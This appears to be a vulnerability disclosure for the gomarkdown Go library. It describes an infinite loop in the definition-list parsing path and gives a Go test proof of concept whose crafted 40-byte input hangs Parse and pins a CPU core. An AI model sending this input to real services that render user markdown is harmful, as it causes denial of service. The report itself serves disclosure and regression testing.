# Infinite loop in gomarkdown parser on an empty definition list

gomarkdown/markdown (commit afa4a469d4f9a75c1dfba0b8c41775ee7cc7537e) never returns from `Parse` for some short inputs
when the DefinitionLists extension is on (it is part of the common extensions used
by `parser.New()`).

In `(*Parser).paragraph` in `parser/block.go`, when a line is followed by `:` the
parser calls `p.list(...)` for a definition list and returns `prev + listLen`. If
`list` consumes nothing (`listLen == 0`) the caller is handed back the same offset
and the block loop spins forever on the same bytes.

Impact: one 40-byte markdown document pins a goroutine at 100% CPU forever, e.g. in
any service that renders user-supplied markdown.

## Reproduce

Drop this test into `parser/` at commit `afa4a469d4f9a75c1dfba0b8c41775ee7cc7537e` and run `go test -run TestPoC -count=1 .` from that directory. It fails (or panics) on the affected code and passes once the issue is fixed.

```go
package parser

import (
	"testing"
	"time"
)

// Input from the fix commit's parser_test.go (TestBug311).
// Vulnerable: Parse loops forever in Parser.paragraph. Fixed: it returns.
func TestPoCBug311InfiniteLoop(t *testing.T) {
	str := "~~~~\xb4~\x94~\x94~\xd1\r\r:\xb4\x94\x94~\x9f~\xb4~\x94~\x94\x94"
	done := make(chan struct{})
	go func() {
		New().Parse([]byte(str))
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("Parse did not return within 5s (infinite loop)")
	}
}
```
